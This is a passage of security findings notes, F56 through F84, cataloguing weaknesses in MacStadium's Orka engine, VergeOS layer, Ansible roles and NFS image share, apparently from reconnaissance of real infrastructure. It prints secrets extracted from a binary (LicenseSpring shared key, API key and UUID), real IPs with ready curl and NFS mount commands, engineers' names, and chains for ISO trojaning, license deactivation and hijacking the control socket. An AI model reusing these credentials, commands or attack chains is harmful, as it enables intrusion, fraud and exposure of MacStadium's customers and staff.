      response = requests.get(f'{self.orka_ip}/resources/vm/list/all', headers=headers)
  ```
- **Chain**:
  - The `orka-licensekey` value = the LicenseSpring API key embedded in the orka-engine binary
  - F36 identified UUID `8ad72323-35e5-477c-ab2c-ea2e080dadc1` as the LicenseSpring API key
  - If this same UUID is the value for `orka-licensekey`: extracting the binary → enumerate ALL customer VMs → get IPs and SSH ports for all VMs across all tenants → SSH admin:admin to any VM
  - Even if `orka-licensekey` is a different per-customer value, it's in the launchd plist (F27) and readable by any local process
- **Impact**: The license key is a cluster-wide privilege escalation token, not just a billing artifact. Control of the license key = full VM inventory access, potentially across tenant namespaces.
- **Severity**: HIGH (CRITICAL if the binary-embedded UUID matches the licensekey API credential)
- **Verification**: `curl -H "Authorization: Bearer <token>" -H "orka-licensekey: 8ad72323-35e5-477c-ab2c-ea2e080dadc1" http://10.221.188.100/resources/vm/list/all`


### F57 — Hardware ECID of MacStadium Build Machine (Tahoe Image Metadata)

- **Source**: containerd blob `106291331e4d1ae8cd0d743d4b27f91443d975d49c96ca755593e1777bca0a7d` (metadata layer of `ghcr.io/macstadium/orka-images/tahoe:latest`)
- **Data** (decoded bplist):
  ```json
  {
    "hardwareModel": {
      "DataRepresentationVersion": 2,
      "PlatformVersion": 2,
      "MinimumSupportedOS": [13, 0, 0]
    },
    "machineIdentifier": {
      "ECID": 9213887118330363845
    }
  }
  ```
  - ECID hex: `0x7FDE4D8450A0FFC5`
  - PlatformVersion 2 = M2 generation Apple Silicon
  - MinimumSupportedOS [13,0,0] = macOS Ventura minimum
- **Source (config blob)**: `restoreImage: /Users/rinoliver/Downloads/UniversalMac_26.5.1_25F80_Restore.ipsw`
  - `rinoliver` = MacStadium engineer username who built this image
  - macOS 26.5.1 build 25F80 = Tahoe (macOS 26) beta
- **Impact**: ECID is a hardware-burned unique identifier for the physical Apple Silicon Mac mini used to create this image. Immutable, specific to that machine. Combined with the username `rinoliver`, attributes the build infrastructure to a specific engineer and specific machine.
- **Severity**: LOW (OPSEC / attribution — no exploit path, but exposes internal build infrastructure details)

### F58 — VergeOS Direct API (govergeos SDK): Full Hypervisor Layer Access

- **Source**: `github.com/macstadium/govergeos` (public Go SDK), CLAUDE.md + DECISIONS.md
- **API**: VergeOS REST API at `/api/v4/`
  - Auth: username/password OR API key Bearer token
  - Env vars: `VERGEOS_HOST`, `VERGEOS_USERNAME`, `VERGEOS_PASSWORD`, `VERGEOS_API_KEY`
  - Rate limit: 50 req/sec (server-side; connection reset on overload, no 429)
  - 77 services: VMs, Networks, Nodes, Volumes, Snapshots, NICs, Drives, Users, NAS, vSAN, etc.
- **Key VM power actions**: `poweron`, `poweroff`, `reset`, `kill`, `clone`, `quiesce_snapshot`, `guestreboot`
- **Node actions**: `enable_maintenance`, `disable_maintenance`, `maintenance_reboot`, `clear_pstore`
- **Sensitive field in VM struct**: `ConsolePass` — console password stored in VM API response, readable by any authenticated user
- **Critical**: This is the PHYSICAL hypervisor layer beneath Orka/K8s. Direct access bypasses all Orka-level RBAC.
- **Severity**: CRITICAL (if credentials are reachable — the hypervisor API controls physical Mac hardware directly)

### F59 — VergeOS Version Disclosure: Unauthenticated /version.json

- **Source**: govergeos DECISIONS.md ADR-016
- **Endpoint**: `GET /version.json` (no auth required, pre-authentication)
- **Returns**: VergeOS major/minor/patch version
- **Purpose**: `NewClient()` in SDK validates server is running VergeOS 26.x before any authenticated calls
- **Impact**: Unauthenticated version fingerprinting of the physical hypervisor layer
- **Severity**: LOW (version disclosure only; enables targeted vulnerability research)

### F60 — VergeOS Schema Discovery: Live API Schema via /$table Endpoint

- **Source**: govergeos DECISIONS.md ADR-013 + schema.go
- **Endpoint pattern**: `GET /api/v4/{resource}/$table`
  - Returns full schema for any resource type including valid field values, types, and list constraints
  - Example: `/api/v4/vms/$table` → returns machine_type options, os_family values, all writable fields
- **Also**: Internal schema extractable on-system via `root-yb-api /v4 -f 'name,schema'`
- **MacStadium internal**: DECISIONS.md reveals `.claude/reference/API-Schema/` directory on their dev machines contains the full VergeOS API schema used to build the SDK — indicates active AI-assisted development with full API schema as Claude context
- **Impact**: Authenticated users can enumerate the complete API surface including field validation rules and valid enum values — no documentation needed
- **Severity**: LOW (requires authentication; schema discovery is expected SDK behavior)

### F61 — bv41 Custom Layer Format: Non-Standard Compression Not Decodable Without orka-engine

- **Source**: Direct analysis of containerd blobs (`7089a3852ee2...` = first disk layer)
- **Format**: Custom 16-byte header "bv41" + 4-byte block size + custom compressed blocks
  ```
  Header (16 bytes):
    [0:4]   "bv41" magic
    [4:8]   0x00010000 (65536) — field unknown
    [8:12]  0x000005DA (1498) — field unknown
    [12:16] 0x0001001F (65567) — field unknown
  Block 0: 16,755,967 bytes compressed
  ```
- **Format incompatibility**: NOT standard lz4 frame (ERROR_frameType_unknown), NOT standard lz4 block (error 770). `lz4cat` cannot decode it.
- **Content confirmed**: Layer 0 decompresses to a GPT-partitioned APFS disk image — visible strings "EFI PART", "BootSystemContainer", "RecoveryOS", "NXSB" (APFS superblock) within compressed data stream
- **Decompression path**: Requires orka-engine binary (Mach-O arm64, not locally available) or full format RE
- **Severity**: INFO (format mapping; no exploit path)

### F62 — Ansible CI User: UID 5013, fastlane + CocoaPods (iOS/macOS Build Infrastructure)

- **Source**: `github.com/macstadium/ansible-role-osx-ci` (public)
- **User setup**:
  ```yaml
  ci_user: ci_user
  ci_user_uid: 5013
  ci_user_group: ci_user
  ci_user_default_keychain: login.keychain
  # REQUIRED (not in defaults):
  ci_user_public_key_location: <path>
  ci_user_default_keychain_password: <secret>
  ```
- **Tools installed**: fastlane, CocoaPods, AdoptJDK 8, Homebrew (homebrew.sh called with `ansible_become_pass` as arg)
- **Critical**: `homebrew.sh` script receives the sudo password as a command-line argument — visible in process list during Ansible run
- **CI profile**: iOS/macOS app building (fastlane = iOS deployment automation, CocoaPods = iOS dependency manager)
- **Severity**: MEDIUM (the keychain password and SSH public key for UID 5013 are required variables injected at provisioning time — if the Ansible vault or inventory is accessible, these are credential targets)

### F63 — VergeOS Guest Agent: Full VM Internal State via API

- **Source**: govergeos `types_machine_status.go` — `MachineStatus.AgentGuestInfo` (type `GuestInfo`)
- **Data exposed per running VM** (via authenticated `GET /api/v4/machine_status`):
  ```
  GuestInfo.OSInfo          — OS name, version, kernel
  GuestInfo.Network[]       — all network interfaces: name, MAC, IPs, MTU, link state
  GuestInfo.FSInfo[]        — all filesystems: mountpoint, type, total/used bytes
  GuestInfo.MemInfo         — RAM total/used/cached
  GuestInfo.Hostname        — VM hostname
  GuestInfo.LastRefresh     — timestamp of last agent poll
  ```
- **Impact**: A single authenticated VergeOS API call returns the full internal network configuration of ALL running VMs, including IPs not exposed via Orka (e.g., additional vNICs, link-local addresses, loopback). Combined with F58 (VergeOS API access), an attacker can enumerate the complete internal network layout of all customer VMs without Orka-layer access.
- **Severity**: HIGH (requires VergeOS authentication — but if VergeOS credentials are reachable via F58 chain, full VM inventory with internal network config is immediate)

### F64 — Ansible CI: Admin Password Exposure via Process List (CVSS: Medium)

- **Source**: `github.com/macstadium/ansible-role-osx-ci` — `files/homebrew.sh` + `tasks/main.yml`
- **Code**:
  ```bash
  # homebrew.sh:
  USER=$1
  PASS=$2         # macOS admin password as positional argument
  echo $PASS | sudo -S su $USER
  ```
  Called from tasks/main.yml as:
  ```yaml
  script: >
    homebrew.sh {{ ansible_become_user | default(ansible_ssh_user) }}
    {{ ansible_become_pass }}
  ```
- **Impact**: `ansible_become_pass` (the macOS admin password for CI machines) is:
  1. Passed as a visible command-line argument — readable via `ps aux` by any local user during provisioning
  2. Echoed to sudo's stdin via the shell command substitution in the script
- **Author**: Custom module by `Ivan Spasov (@ispasov)` — MacStadium engineer
- **Also**: `keychain.py` module creates macOS Keychain entries; keychain password (`ci_user_default_keychain_password`) is a REQUIRED variable injected at provisioning time
- **Severity**: MEDIUM (local process list exposure during provisioning; window is brief but the admin password is the same as the Keychain password for the CI user)

### F65 — bv41 Format: Fully Reverse Engineered (Apple Compression.framework LZ4 Wrapper)

- **Source**: Binary RE of `com.macstadium.orka-engine.server` + `com.macstadium.orka-engine.runvz`
- **Format confirmed** (chunk-based, NOT standard lz4 frame):
  ```
  Chunk header (12 bytes):
    [0:4]  magic       = b'bv41' (compressed) | b'bv4-' (uncompressed passthrough)
    [4:8]  uncomp_size = uint32 little-endian (uncompressed output size)
    [8:12] comp_size   = uint32 little-endian (compressed payload size)
    [12:]  payload     = comp_size bytes of raw LZ4 block data
  Stream terminator: b'bv4$' (4 bytes)
  ```
- **Decoder**: Use `lz4.block.decompress(payload, uncompressed_size=uncomp_size)` — NOT lz4 frame, NOT lz4cat
- **Origin**: Apple's `Compression.framework`, `Compression.Algorithm.lz4` — same format used by macOS Spotlight store databases
- **Swift module**: `OrkaEngineCore.ChunkInputStream` reads chunks; `ImageBundle+Compress.swift` writes them
- **Implemented**: `/home/cowboy/VDT/tools/ablation/core/bv41_decoder.py` — `probe_bv41()`, `decode_bv41()`, `is_bv41()`
- **Severity**: INFO (format documentation; unlocks full tahoe image layer analysis)

### F66 — Two Distinct gRPC Control Planes (orka-engine.sock + run.sock)

- **Source**: Binary strings analysis (`runvz.grpc.swift`, `api.grpc.swift` build paths)
- **Architecture**:
  ```
  orka3 CLI
    └─► /var/run/orka-engine.sock    (engine daemon control plane)
          com.macstadium.orka-engine.server (gRPC server)
            └─► run.sock             (runvz VM runtime plane)
                  com.macstadium.orka-engine.runvz (VZVirtualMachine host)
  ```
- **Proto sources**:
  - `api.grpc.swift` — orka-engine API (image ops: pull/push/list/downloadLatestIPSW; VM ops: start/stop/install/list)
  - `runvz.grpc.swift` — runvz API (direct VM lifecycle: pauseVM, resumeVM, recreate, repartition)
- **Attack surface**: Both sockets use Unix-domain gRPC without TLS. If an attacker gains filesystem access (e.g., via Docker group, writable cron, or lateral movement to the Mac host), direct gRPC protobuf calls to either socket bypasses Orka's authentication layer entirely.
- **Severity**: CRITICAL (Unix socket gRPC without auth — host-local, requires filesystem access to Mac node)

### F67 — Provisioning Profile: Keychain-Access-Groups Wildcard

- **Source**: `embedded.provisionprofile` (CMS-signed, decoded)
- **Entitlements**:
  ```
  com.apple.vm.networking                   = true
  com.apple.application-identifier         = 23KP83Z488.com.macstadium.orka-engine
  keychain-access-groups                   = ['23KP83Z488.*']
  com.apple.developer.team-identifier      = 23KP83Z488
  ```
- **Expiry**: 2043-10-24 (20-year certificate)
- **Critical**: `keychain-access-groups = ['23KP83Z488.*']` grants the engine process access to ALL keychain items in MacStadium's team keychain group — any key, password, or secret stored with the `23KP83Z488` prefix is readable by `com.macstadium.orka-engine.server`
- **Attack chain**: Compromise orka-engine process (e.g., via malicious image or gRPC injection via F66) → read entire MacStadium team keychain (SSH keys, LicenseSpring API key, VergeOS credentials, OCI registry creds)
- **Severity**: HIGH (not directly exploitable from guest VM; requires host-level code execution targeting the engine process)

### F68 — LicenseSpring Product UUID Hardcoded in Public Binary

- **Source**: `strings` on `com.macstadium.orka-engine.server`
- **UUID**: `8ad72323-35e5-477c-ab2c-ea2e080dadc1`
- **API endpoint**: `https://api.licensespring.com`
- **Role**: Identifies MacStadium's Orka product in LicenseSpring's commercial DRM system
- **Exposure**: UUID is in every Orka engine binary installed on customer Mac nodes (downloadable from `distribution.macstadium.com`)
- **DeviceVariable fingerprinting**: LicenseSpring's `DeviceVariable` mechanism fingerprints MAC address, MLB serial, or hardware UUID at license activation — this data is transmitted to `api.licensespring.com` for each activated Orka node
- **Severity**: MEDIUM (UUID alone insufficient for API auth; combined with LicenseSpring API key would expose all customer license metadata)

### F69 — Sentry RR-Web Telemetry: Session Replay Events from Engine Daemon

- **Source**: `Sentry.SentryRRWebEvent` in binary strings + `http://localhost:8969/stream` in both server and runvz binaries
- **DSN source**: Loaded from env var `ORKA_ENGINE_SENTRYDSN` at runtime (see GlobalConfig.Environment.Keys.sentryDSN)
- **Implication**: Orka engine sends RR-Web (Record and Replay) session events to Sentry — this is typically used for capturing UI state, but for a daemon process suggests capturing gRPC call sequences or internal state transitions
- **Local relay**: Both `com.macstadium.orka-engine.server` and `com.macstadium.orka-engine.runvz` connect to `http://localhost:8969/stream` — a local Sentry relay, not direct to sentry.io
- **Attack surface**: If the local relay at :8969 is accessible from within a guest VM (via host networking), intercepting or injecting into the RR-Web stream could surface internal daemon state
- **Severity**: LOW (passive telemetry; relay is localhost-only; no direct exploit path without host access)


### F70 — LicenseSpring Shared Key Hardcoded in Binary (CRITICAL)

- **Source**: Binary RE — `strings` output, 12 bytes before `ORKA_ENGINE_LICENSE_PRODUCT_CODE` string at offset 9425568
- **Values extracted**:
  ```
  Product UUID:  8ad72323-35e5-477c-ab2c-ea2e080dadc1
  Shared key:    C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE  (43-char base64url)
  Second UUID:   90ECE379-E9F0-4393-BC58-64FD7F078F7E
  ```
- **API**: `https://api.licensespring.com` — uses HMAC-Auth (HTTP Signatures): `Signature keyId=<UUID>,algorithm="hmac-sha256",headers="...",signature=<HMAC>`
- **Confirmed active**: API requires `date` + `Authorization` headers; returning structured errors (not blocked) — API endpoint is reachable
- **Impact**: The shared key is the HMAC secret for LicenseSpring SDK requests. With this key + product UUID, an attacker can:
  1. Sign arbitrary LicenseSpring API requests as the Orka product
  2. Enumerate all active Orka license activations (customer hardware fingerprints, activation dates)
  3. Potentially activate or deactivate licenses for Orka customers
  4. Access `DeviceVariable` data — MAC addresses, MLB IDs of all activated Orka nodes
- **Extracted from**: Publicly downloadable `orka-engine-3.5.2.pkg` at `distribution.macstadium.com` — no auth required to download
- **Severity**: CRITICAL (shared key in publicly distributed binary enables signed LicenseSpring API calls; full customer license/device enumeration if API endpoint confirmed)

### F71 — vergeos-exporter: Unauthenticated Full VergeOS Topology at :9888/metrics

- **Source**: `github.com/macstadium/vergeos-exporter` (public), static code analysis
- **Endpoint**: `http://<host>:9888/metrics` — standard Prometheus format
- **Auth**: NONE on the metrics endpoint (no middleware, no basic auth, no TLS required)
- **Data exposed per scrape**:
  ```
  Tenants.List()                 → all tenant names, IDs, resource allocations
  TenantLayer2Networks.List()    → VLAN assignments, network names per tenant
  VMs.List()                     → full VM inventory (names, IDs, status)
  Clusters.List()                → cluster topology and resource specs
  MachineDrivePhys.List()        → drive health (SMART-like: temp, wear, reallocated sectors)
  StorageTiers.List()            → tier capacity, dedup ratio, encryption
  MachineStatus.List()           → node names and running state
  ```
- **Credentials**: Stored as `VERGE_URL` / `VERGE_USERNAME` / `VERGE_PASSWORD` env vars at the exporter process
- **Chain**: vergeos-exporter reachable from Orka node → full VergeOS cluster map → confirms node targets for F58/F59/F60 VergeOS API chain
- **Severity**: HIGH (unauthenticated metrics endpoint; combined with network access to :9888, provides complete infrastructure topology without any credentials)

### F72 — Ansible World-Readable Temp Files: License Key Recovery Vector

- **Source**: `github.com/macstadium/ansible-playbook-osx-ci-setup` — `ansible.cfg`
- **Config**:
  ```ini
  [defaults]
  allow_world_readable_tmpfiles=true
  ```
- **Impact**: During Ansible provisioning runs (`ansible-playbook site.yml`), Jinja2 template rendering writes temp files to `/tmp` with world-readable permissions (mode 0644). The `com.macstadium.orka-engine.server.managed.plist.j2` template contains:
  ```
  ORKA_ENGINE_LICENSE_KEY = {{ install_engine_license_key }}
  ```
  This value is world-readable in `/tmp/ansible-*` during and briefly after provisioning.
- **Recovery timing**: The window is approximately the duration of the provisioning run (minutes). Any local process running during provisioning can read the license key from the temp file.
- **Also at risk**: `ci_user_default_keychain_password` (macOS Keychain password for CI user), `ansible_become_pass` (admin sudo password from F64)
- **Severity**: MEDIUM (requires local process or shell access during provisioning window; window is brief but repeatable on re-provisioning)


### F73 — Full gRPC Service Map Reconstructed from Binary

- **Source**: Static RE of `com.macstadium.orka-engine.server` (arm64) — Swift mangled symbols + proto field string table @ 0x8fde00–0x8fe0a4 + gRPC path strings
- **Artifact**: `/home/cowboy/VDT/intel/MAC-STADIUM/orka-engine-api.proto`
- **Services confirmed**:
  - `VirtualMachineService` (13 RPCs on `/var/run/orka-engine.sock`): List, Create, Start, Stop, Restart, Delete, Clone, Edit, Save, Console, Install, Register, Repartition
  - `ImageService` (6 RPCs): List, Pull, Push, Copy, Delete, DownloadLatestIPSW
  - `SystemService`: GetVersion, GetStatus, GetLicense
  - `VirtualMachineRegistrationService`: Register, Unregister, List
  - `RunVZService` (5 RPCs on `run.sock`): Console, Info, Repartition, Restart, Stop
- **Field names extracted** from binary proto descriptor table:
  ```
  vm_name, image_name, source_name, destination_name, source_image, destination_image
  vnc_port, graphical_console, dynamic_resolution, recovery, mounts, net_interface, attached_disks
  pid, mac_address, display_width, display_height, display_dpi
  reuse_machine_id, disk_size_gb, ipsw, force, insecure, clean_cache
  image_id, space_used, local_name, auth_config, remote_name, archive
  current, total (progress fields for streaming Pull/Push/DownloadLatestIPSW)
  ```
- **RunVZHelper.Options** (Swift struct, fields passed to runvz subprocess): `attachedDisk`, `enableFullUI`, `netInterface`, `disableGraphicalConsole`, `enableDynamicResolution`, `mount`, `vncPort`, `recovery`
- **Exploitation path**: With access to `/var/run/orka-engine.sock` (requires node-level access), the reconstructed proto can drive a custom gRPC client to: enumerate all VMs (List), exfiltrate VNC ports and MAC addresses, install arbitrary IPSW images (VMInstall), repartition VM disks, and snapshot VM state to images (VMSave)
- **Severity**: INFORMATIONAL (requires socket access; finding enables precision attacks once node access is achieved)

### F74 — ORKA_ENGINE_SOCK: gRPC Socket Path Injectable at Runtime

- **Source**: Binary RE — `strings` output, env var table in orka-engine binary
- **Finding**: The orka-engine gRPC server reads its Unix domain socket path from the `ORKA_ENGINE_SOCK` environment variable. It is not hardcoded — it is injected by the LaunchAgent plist at startup.
- **Full env var inventory** (all `ORKA_*` vars extracted from binary):
  ```
  ORKA_CLIPBOARD_SHARING           — clipboard sync feature flag
  ORKA_CLUSTER                     — cluster identifier
  ORKA_CUSTOMER                    — customer identifier
  ORKA_ENGINE_DHCP_LEASE_TIME      — DHCP lease duration
  ORKA_ENGINE_FLUSH                — flush operation trigger
  ORKA_ENGINE_HELPER               — path to runvz helper binary
  ORKA_ENGINE_LICENSE_KEY          — runtime license key (injected from LaunchAgent)
  ORKA_ENGINE_LICENSE_PRODUCT_CODE — product code ("Orka")
  ORKA_ENGINE_LOG_FILE             — log output path
  ORKA_ENGINE_LOG_LEVEL            — verbosity
  ORKA_ENGINE_LOG_STDOUT           — log to stdout flag
  ORKA_ENGINE_SENTRY_DSN           — Sentry crash report endpoint
  ORKA_ENGINE_SOCK                 — gRPC socket path (default: /var/run/orka-engine.sock)
  ORKA_ENGINE_TERMINAL             — terminal mode
  ORKA_ENGINE_VIRTUAL_MACHINE_START_TIMEOUT
  ORKA_ENGINE_VIRTUAL_MACHINE_USER — default VM user
  ORKA_ENVIRONMENT                 — environment tag (dev/prod/staging)
  ```
- **Attack surface**: On a compromised Orka node, modifying `ORKA_ENGINE_SOCK` before engine restart redirects the gRPC control plane socket to an attacker-controlled path. Any client connecting to the original path can be intercepted. Also: `ORKA_ENGINE_SENTRY_DSN` lets you redirect crash telemetry to an attacker-controlled Sentry endpoint on next engine crash.
- **Severity**: MEDIUM (requires node-level code execution to exploit; enables MITM of local gRPC control plane)

---

### F75 — LicenseSpring Management API Key Hardcoded (CRITICAL)

- **Source**: Binary RE — string cluster at offset adjacent to F70 product UUID
- **Third credential identified**: `90ECE379-E9F0-4393-BC58-64FD7F078F7E`
- **Role**: LicenseSpring **Management API key** (UUID format, distinct from the shared key). LicenseSpring SDK requires three credentials: product code, shared key (HMAC for SDK requests), and API key (Management API — license admin operations).
- **Confirmed by binary error string**: `"Could not initialize the LicenseSpring SDK with empty api key"` — establishes this as the `api_key` field
- **All three credentials extracted from publicly downloadable binary**:
  ```
  product_code  = "Orka"
  shared_key    = "C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE"
  api_key       = "90ECE379-E9F0-4393-BC58-64FD7F078F7E"
  ```
- **Management API access grants**: Enumerate all active Orka license activations globally; read/write device records (hardware fingerprints of all Orka nodes); activate or deactivate any Orka license; read customer metadata attached to each activation
- **Severity**: CRITICAL — full LicenseSpring Management API access with three hardcoded credentials in public binary; no customer action required to expose

---

### F76 — Hardware Fingerprint Composition: IOPlatformExpertDevice + Serial + UUID

- **Source**: Binary RE — `IOPlatformExpertDevice`, `serialNumber`, `hardwareModel`, `uuid` strings; LicenseSpring `hardware_id` field mapping
- **Finding**: LicenseSpring `hardware_id` for Orka nodes is derived from the Mac's `IOPlatformExpertDevice` kernel object — specifically `serialNumber` (MLB serial) and/or `uuid` (hardware UUID). This is the identifier used to bind license activations to specific physical Mac nodes.
- **Impact chain**: With the Management API key (F75), an attacker can:
  1. `GET /api/v4/device/?limit=100` → enumerate hardware UUIDs/serials of ALL active Orka nodes globally
  2. Cross-reference against Shodan/Censys fingerprints for node attribution
  3. Selectively deactivate licenses for specific customers
  4. Register a new device under an existing customer's license (license squatting)
- **Severity**: HIGH (enabler for F75 chain; hardware enumeration = full Orka node inventory without any Shodan)

---

### F77 — Sentry RRWeb Session Replay: Full Engine Session Recording

- **Source**: Binary RE — `SentryRRWebEvent`, `SentryRRWebBreadcrumbEvent`, `SentryRRWebSpanEvent`, `SentryReplayType` class names in binary
- **Finding**: The orka-engine binary embeds Sentry's RRWeb session replay SDK. This records full UI session data (clicks, network events, console output, DOM mutations) and streams it to the Sentry endpoint configured in `ORKA_ENGINE_SENTRY_DSN`.
- **Sentry data includes**: `SentryFeedback`, `SentryGeo`, `SentryUser`, `SentryThread`, `SentryFrame` — crash reports include geolocation, user identity, and full stack traces
- **Attack surface**: The Sentry DSN endpoint is injectable via `ORKA_ENGINE_SENTRY_DSN` (F74). If an attacker controls the DSN (set to a malicious Sentry-compatible endpoint), they receive all crash telemetry including session replays, stack traces, user identity, and environment variables captured at crash time (which may include `ORKA_ENGINE_LICENSE_KEY`)
- **Severity**: MEDIUM (requires node access to inject DSN; data exposure if legitimate DSN is found from running process)

---

### F78 — Unauthenticated NFS: MacStadium Image Library Exposed (HIGH)

- **Source**: Prior session intel — `/home/cowboy/VDT/intel/MAC-STADIUM/nfs/isodrive.md`
- **Server**: `207.254.72.172` (Las Vegas datacenter)
- **Export**: `/mnt/isodrive` — no auth, IP-based ACL only (`208.52.182.0/24` and adjacent customer subnets authorized)
- **Mount**: `mount -t nfs -o tcp,noacl,nolock 207.254.72.172:/mnt/isodrive /tmp/nfs_orka`
- **Scope**: Full MacStadium image library — macOS 10.7–13.3 ISOs, Windows 7/8/10/11/Server ISOs, Ubuntu ISOs, Cisco ISE, VMware ESXi/vCenter
- **Customer reachability**: All MacStadium customer subnets are in the authorized ACL range — any customer VM can mount the share and read (and potentially write) the entire image library
- **Severity**: HIGH (unauthenticated read of entire image library; cross-customer visibility; potential write access = supply chain)

---

### F79 — World-Writable ISOs: Supply Chain Attack Surface (CRITICAL)

- **Source**: `isodrive.md` — file permissions on NFS share
- **World-writable files confirmed**:
  ```
  OSX/OSX_10.10.iso          10GB  -rwxrwxrwx  (Yosemite)
  OSX/OS_X_Server_2.2.2.dmg 171MB  -rwxrwxrwx
  OSX/OSX_10.7.4.iso          4.0G  -rwxrwxrwx  (Lion)
  OSX/OSX_10.8.iso             4.5G  -rwxrwxrwx  (Mountain Lion)
  OSX/OSX_10.9.iso             5.6G  -rwxrwxrwx  (Mavericks)
  WINDOWS/*                   most  -rwxrwxrwx
  WINDOWS/WIN10_EVALS/         dir  drwxrwxrwx
  WINDOWS/temp/                dir  drwxrwxrwx
  UBUNTU_SERVER/*              all  -rwxrwxrwx
  UTILTIES/gparted-*               -rwxrwxrwx
  ```
- **Attack**: Any authorized customer VM (or any host in the /24) can overwrite macOS/Windows/Ubuntu ISOs with trojaned versions. MacStadium infrastructure that subsequently provisions from these ISOs installs the attacker's payload. Customers downloading ISOs from this share get the trojaned version.
- **Note**: Newer macOS images (Catalina, Mojave, Big Sur, Ventura) and Win11/Server 2016 are root:wheel (read-only). Legacy images are the attack surface.
- **Severity**: CRITICAL — supply chain write access; any authorized subnet host can replace ISOs; Orka nodes provisioning from legacy images are in scope

---

### F80 — svchost.exe: Impacket SMB/DCE-RPC Tool Staged on NFS Share

- **Source**: `/home/cowboy/VDT/intel/MAC-STADIUM/nfs/svchost_nfs.exe` (local copy of `/mnt/isodrive/WINDOWS/temp/svchost.exe`)
- **File**: PE32 console executable, 7.9MB, PyInstaller-bundled Python
- **Impacket modules confirmed bundled**:
  ```
  impacket.dcerpc.v5.{samr, scmr, srvs, lsad, nrpc, transport, rpcrt}
  impacket.krb5.{kerberosv5, gssapi, ccache, constants}
  impacket.ntlm, impacket.smb, impacket.smb3
  impacket.examples.remcomsvc    ← remote service installation
  impacket.examples.serviceinstall
  mysmb                          ← custom SMB implementation (EternalBlue-family)
  ```
- **Assessment**: PyInstaller-packaged offensive tool — impacket with `remcomsvc`/`serviceinstall` = psexec-style remote code execution over SMB; `mysmb` custom module suggests EternalBlue (MS17-010) or similar SMB exploit capability; full Kerberos + NTLM support for credential relay
- **Context**: File placed in `/mnt/isodrive/WINDOWS/temp/` by a host at `.90` in a prior session. Random-named EXEs also present (`JxjEKoTV.exe` 55KB, plus several 0-byte stubs). Tool staged on world-writable NFS for retrieval from Windows targets on the MacStadium network.
- **Severity**: HIGH — confirms offensive tool staging on MacStadium infrastructure; world-writable NFS as C2/staging medium; SMB lateral movement capability present

---

## orka-vm-tools Analysis (Inside-VM Daemon)

### F81 — LaunchAgent Plist Duplicate Key Bug: ORKA_VM_TOOLS_PATH Silently Dropped

- **Source**: `/Library/LaunchAgents/com.orka.vm.tools.agent.plist` — static analysis
- **Bug**: The plist contains two `<key>EnvironmentVariables</key>` entries. Apple's plist parser processes duplicate keys by taking the LAST occurrence. The first entry (`ORKA_VM_TOOLS_PATH=/Applications/orka-vm-tools`) is silently dropped; only the second entry (`ORKA_MODE=agent`, `ORKA_AUTOMATICALLY_SET_RESOLUTION=1`) takes effect.
- **Impact**: The agent-mode binary starts without `ORKA_VM_TOOLS_PATH` set. Any code path that reads `ORKA_VM_TOOLS_PATH` to find sibling tools or scripts gets an empty string — falls back to hardcoded paths or silently fails.
- **Root cause**: Copy-paste error in plist authoring — standard Apple developer mistake, rarely noticed because the binary has a hardcoded fallback.
- **Severity**: LOW (operational bug; no direct security impact unless tool path fallback is unsafe)

---

### F82 — orka-vm-tools Architecture: Go Daemon, chi HTTP on 169.254.169.254, Bidirectional Clipboard Sync

- **Source**: Binary RE — Go build info, dep list, function symbols
- **Language**: Go (not Swift) — compiled binary, 8.9MB
- **HTTP router**: `github.com/go-chi/chi v4.1.2` — chi Mux registered routes
- **Key dependencies**:
  ```
  github.com/atotto/clipboard v0.1.4  — clipboard R/W via pbcopy/pbpaste
  github.com/avast/retry-go/v4 v4.6.0 — retry with backoff
  github.com/rs/zerolog v1.33.0        — structured logging
  golang.org/x/sys v0.28.0             — syscall bindings
  ```
- **Listen address**: `169.254.169.254` (link-local; accessible from inside the VM only — not routable)
- **Two execution modes** (same binary, different `ORKA_MODE`):
  - `ORKA_MODE=` (unset) — LaunchDaemon: runs as root, `KeepAlive=true`, serves metadata HTTP + clipboard sync
  - `ORKA_MODE=agent` — LaunchAgent: runs as user, enforces display resolution, `ORKA_AUTOMATICALLY_SET_RESOLUTION=1`
- **Clipboard sync**: `listenForClipboard` + `vm.clipboardManager` — bidirectional; pushes host clipboard to VM and VM clipboard to host via `github.com/atotto/clipboard` (calls `pbcopy`/`pbpaste` under the hood)
- **virtiofs/serial**: `/dev/tty.virtio` string present — virtio serial device for host↔VM communication channel separate from the HTTP layer
- **Log files**: 
  - Daemon: `/var/log/orka-vm-tools.log`
  - Agent: `/Applications/orka-vm-tools/logs/orka-vm-tools-agent.log`
- **Severity**: INFORMATIONAL (architecture map; access to 169.254.169.254 from inside VM is expected)

---

### F83 — /debug/pprof/ Exposed on Metadata Server: Go Runtime Leak

- **Source**: Binary RE — `*[8]pprof.handler`, `/debug/pprof/` route string in orka-vm-tools
- **Endpoint**: `http://169.254.169.254/debug/pprof/` — standard Go `net/http/pprof` handler registered with chi router
- **Data exposed** (all unauthenticated):
  ```
  /debug/pprof/            — index of profiles
  /debug/pprof/heap        — heap memory snapshot
  /debug/pprof/goroutine   — all goroutine stacks
  /debug/pprof/allocs      — memory allocation profile
  /debug/pprof/block       — goroutine blocking profile
  /debug/pprof/threadcreate — OS thread creation
  /debug/pprof/cmdline     — process command line (+ env args)
  /debug/pprof/profile     — 30s CPU profile
  /debug/pprof/trace       — execution trace
  ```
- **Impact**: Any code running inside the Orka VM can fetch `/debug/pprof/goroutine?debug=2` to get full goroutine stacks including local variable values, or `/debug/pprof/heap` to snapshot heap state. Leaks internal state of the metadata server — request handling logic, active connections, clipboard buffer contents if in heap.
- **Chain**: Inside-VM code → `GET http://169.254.169.254/debug/pprof/goroutine?debug=2` → full runtime state dump, no credentials required
- **Severity**: MEDIUM (inside-VM access required; leaks metadata server internals and clipboard state)

---

### F84 — com.macstadium.resolution.set: Private Resolution API

- **Source**: Binary RE — `com.macstadium.resolution.set` string + `main.enforceResolution` function + `Error setting display resolution: %v` / `Error getting display info: %v`
- **Finding**: The agent-mode binary enforces display resolution via a private macOS API identified by the string `com.macstadium.resolution.set`. This is likely a distributed notification or an IOKit/CoreGraphics private API call that MacStadium registers.
- **No AppleParavirtDisplay**: `no AppleParavirtDisplay found` error string confirms this calls Apple's private virtual display driver path — if the paravirtualized display isn't present, resolution enforcement silently fails.
- **Attack surface**: If an attacker can trigger `ORKA_AUTOMATICALLY_SET_RESOLUTION=1` from a non-agent context, or send the `com.macstadium.resolution.set` notification from inside the VM, they may be able to manipulate the guest display configuration.
